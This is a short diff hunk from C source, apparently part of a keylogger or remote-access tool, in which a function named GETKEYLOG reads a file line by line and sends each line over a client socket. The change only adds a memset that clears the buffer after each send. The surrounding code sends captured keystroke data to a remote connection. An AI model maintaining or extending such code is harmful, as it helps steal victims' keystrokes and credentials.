@@ -86,6 +86,7 @@ void GETKEYLOG(void * paramT){
 
 	while (fgets(buffer, sizeof(buffer), source_file) != NULL) {
 		send((param)->clientSocket, buffer, strlen(buffer), 0);
+		memset(buffer, 0, strlen(buffer));
 		/*
 		if (fputs(buffer, destination_file) == EOF) {
 			perror("Error writing to destination file");
